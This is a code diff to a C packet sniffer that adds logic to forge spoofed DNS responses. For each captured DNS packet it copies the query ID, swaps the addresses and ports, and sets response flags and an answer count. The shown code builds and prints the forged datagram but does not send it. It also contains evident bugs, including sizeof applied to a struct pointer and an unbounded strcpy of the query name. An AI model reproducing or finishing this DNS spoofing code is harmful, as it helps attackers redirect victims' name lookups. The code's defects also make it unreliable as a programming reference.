@@ -41,6 +41,22 @@ struct sniff_ip {
         u_short ip_sum;                 /* checksum */
         struct  in_addr ip_src,ip_dst;  /* source and dest address */
 };
+
+struct dns_header {
+	u_short id;
+	u_short flags;
+	u_short qdcount;
+	u_short ancount;
+	u_short nscount;
+	u_short arcount;
+};
+
+struct dns_query {
+	u_char *qname;
+	u_short qtype;
+	u_short qclass;
+};
+
 #define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
 #define TH_OFF(th)      		((th)->th_off)
 
@@ -192,17 +208,65 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 			const struct udphdr *udp;            /* The UDP header */
 			udp = (struct udphdr*)(packet + SIZE_ETHERNET + size_ip);
 
-			*payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + 8);
-			*size_payload = ntohs(ip->ip_len) - (size_ip + 8);
+			*payload = (u_char *)(packet + SIZE_ETHERNET);
+			*size_payload = ntohs(ip->ip_len);
+
+			char datagram[8192];
+
+			// Forging the IP header
+			struct sniff_ip *spoofed_ip_header = (struct sniff_ip *)datagram;
+			memset(datagram, 0, 8192);
+
+			spoofed_ip_header->ip_vhl = ip->ip_vhl;
+			spoofed_ip_header->ip_tos = ip->ip_tos;
+
+			int size_of_forged_dns_response = ntohs(ip->ip_len) + 16;
+			spoofed_ip_header->ip_len = htons(size_of_forged_dns_response);
+			spoofed_ip_header->ip_id = ip->ip_id;
+			spoofed_ip_header->ip_off = ip->ip_off;
+			spoofed_ip_header->ip_ttl = 200;
+			spoofed_ip_header->ip_p = ip->ip_p;
+			spoofed_ip_header->ip_sum = 0;
+			spoofed_ip_header->ip_src.s_addr = ip->ip_dst.s_addr;
+			spoofed_ip_header->ip_dst.s_addr = ip->ip_src.s_addr;
+
+			// Forging the UDP header
+			struct udphdr* spoofed_udp_header = (struct udphdr*)(datagram + size_ip);
+			spoofed_udp_header->uh_sport = udp->uh_dport;
+			spoofed_udp_header->uh_dport = udp->uh_sport;
+			spoofed_udp_header->uh_ulen	 = htons(ntohs(udp->uh_ulen) + 16);
+			spoofed_udp_header->uh_sum = 0;
 
 			if(ntohs(udp->uh_sport) == 53 || ntohs(udp->uh_dport) == 53)
 			{
+				// Forging the DNS Header
+				struct dns_header* spoofed_dns_header = (struct dns_header*)(datagram + size_ip + sizeof(struct udphdr));
+				const struct dns_header *dns;
+				dns = (struct dns_header*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr));
+				spoofed_dns_header->id = dns->id;
+				spoofed_dns_header->flags = htons(33152); // Setting flags as 8180 (33152 is 81 80 in hexadecimal)
+				spoofed_dns_header->qdcount = dns->qdcount;
+				spoofed_dns_header->ancount = htons(1);
+				spoofed_dns_header->nscount = dns->nscount;
+				spoofed_dns_header->arcount = dns->arcount;
+
+				char name1[100000];
+				memset(name1, '\0', sizeof(name1));
+				char *query = (char*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header*));
+				strcpy(name1, query);
 				sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
 				sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
+
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
+					sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
 					sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
+					sprintf(args + strlen(args), " Lengh of qname is %lu bytes", strlen(name1));
 					printf("%s\n", args);
 					print_payload(*payload, *size_payload);
+					printf("Response Start\n");
+					u_char *pay1 = (u_char*)datagram;
+					print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header));
+					printf("Response End\n");
 				}
 			}
 			break;
